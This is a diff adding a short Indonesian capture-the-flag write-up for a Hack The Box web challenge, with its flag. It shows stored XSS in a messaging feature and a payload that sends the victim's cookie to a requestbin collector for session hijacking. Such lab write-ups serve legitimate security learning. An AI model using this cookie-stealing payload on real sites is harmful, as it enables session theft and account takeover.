@@ -1,0 +1,19 @@
+HTB{d0nt_trust_str4ng3r5_bl1ndly}
+
+requirement: web enumeration knowledge, web structure
+gain: XSS knowledge
+
+1. masuk ke onlyhack setelah kalian nyalakan mesinnya
+2. Register terlebih dahulu agar bisa login ke webnya
+3. setelah itu kalian klik love semuanya dan klik menuju ke massage
+4. kalian coba kirim pesan ke renata karena dia selalu online dari deskripsinya
+5. setelah itu cobalah kirim <script>alert('XSS')</script
+6. Jika berhasil, maka vurnerable yang didapatkan adalah XSS 
+7. karena di deskripsi dari judul challenge ini adalah mencari sesuatu yang memungkinkan untuk dicuri, kita bisa asumsikan kalau yang dicuri ini adalah cookie dari lawan.
+8. Kita bisa mengambil cookie dengan cara pergi ke website https://requestbin.whapi.cloud setelah itu create request
+9. copy link address dari http requestbin tersebut dan kita balik ke onlyhacks tadi
+10. pergi ke pesan renata lagi dan isi pesan dengan <script>document.location='http://requestbinkalian:port/randomnumber?cookie='+document.cookie</script>
+11. setelah itu enter dan kalian balik ke web requestbin dan akan terdapat 2 get, tetapi ambillah cookie yang tidak sesuai sama cookie kalian (kalian bisa mengecek cookie kalian dengan inspect lalu ke storage)
+12. sesudah itu ke onlyhacks lagi dan kalian ganti (replace dengan ctrl+v) cookie kalian dengan cookie yang baru saja kalian copy sesudah itu paste lalu refresh.
+
+
